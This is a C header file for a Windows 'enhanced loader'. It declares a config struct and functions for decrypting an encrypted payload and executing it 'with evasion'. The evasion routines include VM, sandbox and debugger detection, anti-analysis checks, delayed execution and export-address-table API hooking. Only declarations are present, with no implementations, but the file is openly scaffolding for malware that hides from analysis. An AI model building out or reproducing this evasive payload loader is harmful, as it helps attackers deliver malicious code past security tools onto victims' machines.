#ifndef ENHANCED_LOADER_H
#define ENHANCED_LOADER_H

#include <windows.h>

typedef struct _ENHANCED_CONFIG {
    BOOL enableEATHooking;
    BOOL enableVMDetection;
    BOOL enableSandboxDetection;
    BOOL enableDebuggerDetection;
    BOOL enableAntiAnalysis;
    DWORD delayExecution;
    CHAR decryptionKey[32];
} ENHANCED_CONFIG, *PENHANCED_CONFIG;

// Function declarations
BOOL InitializeEnhancedLoader(PENHANCED_CONFIG pConfig);
BOOL ExecutePayloadWithEvasion(PVOID pPayload, DWORD dwPayloadSize);
BOOL CheckAnalysisEnvironment();
VOID CleanupEnhancedLoader();

// Payload decryption functions
BOOL DecryptPayload(PVOID pEncrypted, DWORD dwSize, LPCSTR lpKey, PVOID* ppDecrypted, PDWORD pdwDecryptedSize);

// External evasion function declarations
extern BOOL IsRunningInVM();
extern BOOL IsRunningInSandbox();
extern BOOL IsBeingDebugged();

// External EAT hooking functions
extern BOOL InitializeEATHooking();
extern BOOL InitializeAPIHooks();
extern VOID CleanupEATHooking();

#endif
